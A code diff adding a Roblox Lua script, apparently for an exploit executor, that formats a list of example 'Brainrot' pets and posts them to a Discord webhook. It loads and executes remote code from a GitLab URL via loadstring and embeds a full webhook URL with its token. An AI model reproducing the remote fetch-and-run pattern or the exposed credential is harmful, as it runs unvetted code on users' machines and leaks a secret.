@@ -1,0 +1,52 @@
+local HttpService = game:GetService("HttpService")
+
+-- Load Brainrots emoji table from GitLab
+local success, Brainrots = pcall(function()
+    return loadstring(game:HttpGet("https://gitlab.com/nolag-idp-group/emojisforstlr/-/raw/main/stlr"))()
+end)
+
+if not success or type(Brainrots) ~= "table" then
+    warn("Failed to load Brainrots table!")
+    Brainrots = {}
+end
+
+-- Example pets detected
+local detectedPets = {
+    {name="Dragon Cannelloni", value="20M/s", floor="2nd Floor"},
+    {name="Los Spaghettis", value="5M/s", floor="1st Floor"},
+    {name="Unknown Brainrot", value="1M/s", floor="1st Floor"}
+}
+
+-- Build lines using guaranteed emoji detection
+local lines = {}
+for _, pet in ipairs(detectedPets) do
+    -- Exact key lookup in Brainrots table; fallback to 🧠 if not found
+    local emoji = Brainrots[pet.name] or "🧠"
+    table.insert(lines, string.format("%s %s → %s → %s", emoji, pet.name, pet.value, pet.floor))
+end
+
+-- Example payload for webhook
+local WEBHOOK = "https://discord.com/api/webhooks/1440740185871483043/KxPIkjhCn4ZGTP1dnB1CJFuOUBuZIj9OUp3nWG5KZnNugAHzHeLm-QgwqVE_1n5M2xdZ"
+local payload = {
+    content = "Test Brainrots:",
+    embeds = {{
+        title = "Brainrots Detected",
+        color = 123456,
+        fields = {
+            {name="Pets", value = table.concat(lines, "\n")}
+        }
+    }}
+}
+
+-- Send to webhook
+local req = (syn and syn.request) or http_request or request
+if req and WEBHOOK and WEBHOOK ~= "" then
+    pcall(function()
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
